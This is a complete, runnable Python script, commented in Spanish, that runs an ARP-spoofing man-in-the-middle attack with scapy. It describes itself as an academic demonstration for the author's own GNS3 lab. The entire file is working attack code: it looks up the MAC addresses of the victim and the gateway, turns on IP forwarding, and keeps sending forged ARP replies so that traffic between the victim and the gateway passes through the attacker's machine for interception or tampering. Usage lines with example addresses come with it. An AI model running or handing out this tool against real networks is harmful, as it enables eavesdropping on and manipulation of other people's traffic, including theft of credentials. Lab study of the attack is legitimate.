#!/usr/bin/env python3
"""
arp_mitm.py
-----------
Demostracion academica de un ataque Man-in-the-Middle (MitM) mediante
ARP Spoofing. USO EXCLUSIVO EN LABORATORIO PROPIO (GNS3).

Objetivo del script:
    Envenenar las tablas ARP de dos hosts para que todo el trafico
    entre ellos atraviese el equipo atacante, permitiendo su
    intercepcion y/o manipulacion.

Parametros:
    -v / --victim   : IP de la victima  (requerido)
    -g / --gateway  : IP del gateway    (requerido)
    -i / --iface    : Interfaz de red   (default: eth0)
    --interval      : Segundos entre reenvios ARP (default: 2)

Requisitos:
    - Linux con privilegios de root (sudo)
    - Python 3.8+
    - pip install scapy
    - Las maquinas en el mismo dominio de broadcast (misma VLAN)
    - IP forwarding: el script lo habilita automaticamente

Uso:
    sudo python3 arp_mitm.py -v 20.23.3.11 -g 20.23.3.1
    sudo python3 arp_mitm.py -v 20.23.3.11 -g 20.23.3.1 -i eth0 --interval 1.0
    Ctrl+C para detener y restaurar las tablas ARP legitimas.
"""

import sys
import time
import argparse
from scapy.all import ARP, Ether, send, srp


def parse_args():
    parser = argparse.ArgumentParser(
        description="ARP MitM - Laboratorio GNS3 (uso academico)"
    )
    parser.add_argument("-v", "--victim",  required=True, help="IP de la victima (ej: 20.23.3.11)")
    parser.add_argument("-g", "--gateway", required=True, help="IP del gateway (ej: 20.23.3.1)")
    parser.add_argument("-i", "--iface",   default="eth0", help="Interfaz de red (default: eth0)")
    parser.add_argument("--interval",      type=float, default=2.0, help="Segundos entre reenvios ARP (default: 2)")
    return parser.parse_args()


def get_mac(ip, iface):
    """Resuelve la MAC de una IP via ARP request broadcast."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=iface, verbose=0,
    )
    for _, resp in ans:
        return resp.hwsrc
    return None


def spoof(target_ip, target_mac, spoof_ip, iface):
    """Envia ARP reply falso: le dice a target_ip que spoof_ip = MAC atacante."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), iface=iface, verbose=0)


def restore(ip1, mac1, ip2, mac2, iface):
    """Restaura las tablas ARP con la informacion legitima."""
    send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2), count=5, iface=iface, verbose=0)
    send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1), count=5, iface=iface, verbose=0)


def enable_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")


def disable_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")


def main():
    args = parse_args()

    print("=" * 60)
    print("  ARP MitM ATTACK - Laboratorio GNS3")
    print(f"  Victima: {args.victim} | Gateway: {args.gateway}")
    print(f"  Interfaz: {args.iface} | Intervalo: {args.interval}s")
    print("=" * 60)

    print("\n[*] Resolviendo MACs...")
    mac_victim  = get_mac(args.victim,  args.iface)
    mac_gateway = get_mac(args.gateway, args.iface)

    if not mac_victim:
        print(f"[!] No se pudo resolver la MAC de la victima {args.victim}")
        print("    Verifica que la VPCS haya obtenido IP por DHCP y que haga ping al gateway.")
        sys.exit(1)
    if not mac_gateway:
        print(f"[!] No se pudo resolver la MAC del gateway {args.gateway}")
        sys.exit(1)

    print(f"    MAC Victima : {mac_victim}")
    print(f"    MAC Gateway : {mac_gateway}")

    enable_forwarding()
    print("[*] IP Forwarding habilitado.")
    print("[*] Envenenando tablas ARP... (Ctrl+C para detener)\n")

    sent = 0
    try:
        while True:
            spoof(args.victim,  mac_victim,  args.gateway, args.iface)
            spoof(args.gateway, mac_gateway, args.victim,  args.iface)
            sent += 2
            print(f"\r    [+] Paquetes ARP enviados: {sent}", end="", flush=True)
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n\n[!] Restaurando tablas ARP...")
        restore(args.victim, mac_victim, args.gateway, mac_gateway, args.iface)
        disable_forwarding()
        print("[+] Tablas ARP restauradas. IP Forwarding deshabilitado.")


if __name__ == "__main__":
    main()
